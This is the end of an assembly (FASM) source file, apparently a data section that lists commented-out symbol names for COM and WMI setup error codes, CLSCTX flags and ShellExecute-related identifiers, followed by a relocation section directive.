		;COM_Error_LibInit_IA,							'COM_Error_LibInit_IA',\
		;COM_Error_LibInit_OM,							'COM_Error_LibInit_OM',\
		;COM_Error_LibInit_UE,							'COM_Error_LibInit_UE',\
		;COM_LibInit_SUCCESS,							'COM_LibInit_SUCCESS',\
		;COM_InitSec_IA,									'COM_InitSec_IA',\
		;COM_InitSec_RPC_E_TL,							'COM_InitSec_RPC_E_TL',\
		;COM_InitSec_RPC_E_NGSP,							'COM_InitSec_RPC_E_NGSP',\
		;COM_InitSec_E_OOM,								'COM_InitSec_E_OOM',\
		;COM_InitSec_SUCCESS,							'COM_InitSec_SUCCESS',\
		;COM_CreateInst_REGDB_E_CNR,						'COM_CreateInst_REGDB_E_CNR',\
		;COM_CreateInst_E_NA,							'COM_CreateInst_E_NA',\
		;COM_CreateInst_E_NI,							'COM_CreateInst_E_NI',\
		;COM_CreateInst_E_PTR,							'COM_CreateInst_E_PTR',\
		;COM_CreateInst_E_IA,							'COM_CreateInst_E_IA',\
		;COM_CreateInst_E_OM,							'COM_CreateInst_E_OM',\
		;COM_CreateInst_E_UE,							'COM_CreateInst_E_UE',\
		;COM_CreateInst_SUCCESS,							'COM_CreateInst_SUCCESS',\
		;COM_ConnServer_E_AD,							'COM_ConnServer_E_AD',\
		;COM_ConnServer_E_F,								'COM_ConnServer_E_F',\
		;COM_ConnServer_WBEM_E_IN,						'COM_ConnServer_WBEM_E_IN',\
		;COM_ConnServer_WBEM_E_IP,						'COM_ConnServer_WBEM_E_IP',\
		;COM_ConnServer_E_OOM,							'COM_ConnServer_E_OOM',\
		;COM_ConnServer_E_TF,							'COM_ConnServer_E_TF',\
		;COM_ConnServer_E_LC,							'COM_ConnServer_E_LC',\
		;COM_ConnServer_SUCCESS,							'COM_ConnServer_SUCCESS',\
		;COM_CoSetProxyBlanket_IA,						'COM_CoSetProxyBlanket_IA',\
		;COM_CoSetProxyBlanket_SUCCESS,					'COM_CoSetProxyBlanket_SUCCESS',\
		;COM_CreateInst2_REGDB_E_CNR,					'COM_CreateInst2_REGDB_E_CNR',\
		;COM_CreateInst2_E_NA,							'COM_CreateInst2_E_NA',\
		;COM_CreateInst2_E_NI,							'COM_CreateInst2_E_NI',\
		;COM_CreateInst2_E_PTR,							'COM_CreateInst2_E_PTR',\
		;COM_CreateInst2_SUCCESS,						'COM_CreateInst2_SUCCESS',\
		;COM_ENQA_Error_AD,								'COM_ENQA_Error_AD',\
		;COM_ENQA_Error_F,								'COM_ENQA_Error_F',\
		;COM_ENQA_Error_IP,								'COM_ENQA_Error_IP',\
		;COM_ENQA_Error_IQ,								'COM_ENQA_Error_IQ',\
		;COM_ENQA_Error_IQT,								'COM_ENQA_Error_IQT',\
		;COM_EQNA_Error_OOM,								'COM_EQNA_Error_OOM',\
		;COM_EQNA_SUCCESS,								'COM_EQNA_SUCCESS',\
		;COM_CreateInst2_E_IA,							'COM_CreateInst2_E_IA',\
		;COM_CreateInst2_E_OM,							'COM_CreateInst2_E_OM',\
		;COM_CreateInst2_E_UE,							'COM_CreateInst2_E_UE'
		;CLSCTX_INPROC_SERVER,							'CLSCTX_INPROC_SERVER',\
		;CLSCTX_INPROC_HANDLER,							'CLSCTX_INPROC_HANDLER',\
		;CLSCTX_LOCAL_SERVER,							'CLSCTX_LOCAL_SERVER',\
		;CLSCTX_INPROC_SERVER16,							'CLSCTX_INPROC_SERVER16',\
		;CLSCTX_REMOTE_SERVER,							'CLSCTX_REMOTE_SERVER',\
		;CLSCTX_INPROC_HANDLER16,						'CLSCTX_INPROC_HANDLER16',\
		;CLSCTX_INPROC_SERVERX86,						'CLSCTX_INPROC_SERVERX86',\
		;CLSCTX_INPROC_HANDLERX86,						'CLSCTX_INPROC_HANDLERX86',\
		;CLSCTX_ESERVER_HANDLER,							'CLSCTX_ESERVER_HANDLER',\
		;CLSCTX_NO_CODE_DOWNLOAD,						'CLSCTX_NO_CODE_DOWNLOAD',\
		;CLSCTX_NO_CUSTOM_MARSHAL,						'CLSCTX_NO_CUSTOM_MARSHAL',\
		;CLSCTX_ENABLE_CODE_DOWNLOAD,					'CLSCTX_ENABLE_CODE_DOWNLOAD',\
		;CLSCTX_NO_FAILURE_LOG,							'CLSCTX_NO_FAILURE_LOG',\
		;CLSCTX_DISABLE_AAA,								'CLSCTX_DISABLE_AAA',\
		;CLSCTX_ENABLE_AAA,								'CLSCTX_ENABLE_AAA',\
		;CLSCTX_FROM_DEFAULT_CONTEXT,					'CLSCTX_FROM_DEFAULT_CONTEXT',\
		;WMI_DefaultNamespace,							'WMI_DefaultNamespace',\
		;COM_ERROR_LibInit,								'COM_ERROR_LibInit',\
		;COM_ERROR_LibInit_InvalidArg,					'COM_ERROR_LibInit_InvalidArg',\
		;COM_ERROR_LibInit_OOM,							'COM_ERROR_LibInit_OOM',\
		;COM_ERROR_LibInit_Unexpected,					'COM_ERROR_LibInit_Unexpected',\
		;SetUp_COM,										'SetUp_COM'
		;COM_Error_LibInit_IA,							'COM_Error_LibInit_IA',\
		;COM_Error_LibInit_OM,							'COM_Error_LibInit_OM',\
		;COM_Error_LibInit_UE,							'COM_Error_LibInit_UE',\
		;COM_ERROR_InitSec_InvalidArg,							'COM_ERROR_InitSec_InvalidArg',\
		;COM_ERROR_InitSec_RPC_E_TOO_LATE,						'COM_ERROR_InitSec_RPC_E_TOO_LATE',\
		;COM_ERROR_InitSec_RPC_E_NO_GOOD_SECURITY_PACKAGES,		'COM_ERROR_InitSec_RPC_E_NO_GOOD_SECURITY_PACKAGES',
		;COM_ERROR_InitSec_E_OOM,								'COM_ERROR_InitSec_E_OOM',\
		;COM_ERROR_CreateInst_REGDB_E_CLASSNOTREG,				'COM_ERROR_CreateInst_REGDB_E_CLASSNOTREG',\
		;COM_ERROR_CreateInst_CLASS_E_NOAGGREGATION,				'COM_ERROR_CreateInst_CLASS_E_NOAGGREGATION',\
		;COM_ERROR_CreateInst_E_NOINTERFACE,						'COM_ERROR_CreateInst_E_NOINTERFACE',\
		;COM_ERROR_CreateInst_E_POINTER,							'COM_ERROR_CreateInst_E_POINTER',\
		;COM_ERROR_WbemLoc_WBEM_E_ACCESS_DENIED,					'COM_ERROR_WbemLoc_WBEM_E_ACCESS_DENIED',\
		;COM_ERROR_WbemLoc_WBEM_E_FAILED,						'COM_ERROR_WbemLoc_WBEM_E_FAILED',\
		;COM_ERROR_WbemLoc_WBEM_E_INVALID_NAMESPACE,				'COM_ERROR_WbemLoc_WBEM_E_INVALID_NAMESPACE',\
		;COM_ERROR_WbemLoc_WBEM_E_INVALID_PARAMETER,				'COM_ERROR_WbemLoc_WBEM_E_INVALID_PARAMETER',\
		;COM_ERROR_WbemLoc_WBEM_E_OOM,							'COM_ERROR_WbemLoc_WBEM_E_OOM',\
		;COM_ERROR_WbemLoc_WBEM_E_TRANSPORT_FAILURE,				'COM_ERROR_WbemLoc_WBEM_E_TRANSPORT_FAILURE',\
		;COM_ERROR_WbemLoc_WBEM_E_LOCAL_CREDENTIALS,				'COM_ERROR_WbemLoc_WBEM_E_LOCAL_CREDENTIALS',\
		;pLoc,													'pLoc',\
		;pSvcs,													'pSvcs',\
		;pUnsecApp,												'pUnsecApp',\
		;SetUp_COM,												'SetUp_COM'
		;COM_Error_LibInit_IA,									'COM_Error_LibInit_IA',\
		;COM_Error_LibInit_OM,									'COM_Error_LibInit_OM',\
		;COM_Error_LibInit_UE,									'COM_Error_LibInit_UE',\
		;COM_LibInit_SUCCESS,									'COM_LibInit_SUCCESS',\
		;COM_InitSec_IA,											'COM_InitSec_IA',\
		;COM_InitSec_RPC_E_TL,									'COM_InitSec_RPC_E_TL',\
		;COM_InitSec_RPC_E_NGSP,									'COM_InitSec_RPC_E_NGSP',\
		;COM_InitSec_RPC_E_OOM,									'COM_InitSec_RPC_E_OOM',\
		;COM_InitSec_SUCCESS,									'COM_InitSec_SUCCESS',\
		;COM_CreateInst_REGDB_E_CNR,								'COM_CreateInst_REGDB_E_CNR',\
		;COM_CreateInst_E_NA,									'COM_CreateInst_E_NA',\
		;COM_CreateInst_E_NI,									'COM_CreateInst_E_NI',\
		;COM_CreateInst_E_PTR,									'COM_CreateInst_E_PTR',\
		;COM_CreateInst_SUCCESS,									'COM_CreateInst_SUCCESS',\
		;COM_CreateInst_E_AD,									'COM_CreateInst_E_AD',\
		;COM_CreateInst_E_F,										'COM_CreateInst_E_F',\
		;COM_CreateInst_WBEM_E_IN,								'COM_CreateInst_WBEM_E_IN',\
		;COM_CreateInst_WBEM_E_IP,								'COM_CreateInst_WBEM_E_IP',\
		;COM_CreateInst_E_OOM,									'COM_CreateInst_E_OOM',\
		;COM_CreateInst_E_TF,									'COM_CreateInst_E_TF',\
		;COM_CreateInst_E_LC,									'COM_CreateInst_E_LC',\
		;COM_CreateInst_SUCCESS,									'COM_CreateInst_SUCCESS',\
		;COM_CoSetProxyBlanket_IA,								'COM_CoSetProxyBlanket_IA',\
		;COM_CoSetProxyBlanket_SUCCESS,							'COM_CoSetProxyBlanket_SUCCESS'
		
		;Problem identifiers
			;lpDst_1stHalf,									'lpDst_1stHalf',\
			;lpDst_2ndHalf,									'lpDst_2ndHalf',\
			;lpShellExecute_Drv_Length,						'lpShellExecute_Drv_Length',\
			;lpShellExecute_WinDir_Length,					'lpShellExecute_WinDir_Length',\
			;lpShellExecute_SysDir_Length,					'lpShellExecute_SysDir_Length',\
			;lpShellExecute_Filename_Length,					'lpShellExecute_Filename_Length',\
			;ProcessCreationError,							'ProcessCreationError',\
			;FileExistanceDetected,							'FileExistanceDetected',\
		
		;_error,											'_error',\
		;_breakpointmsg,									'_breakpointmsg',\
		;_breakpointmsg2,								'_breakpointmsg2',\
		;start,'start'
		
;end data


section '.reloc' fixups data readable discardable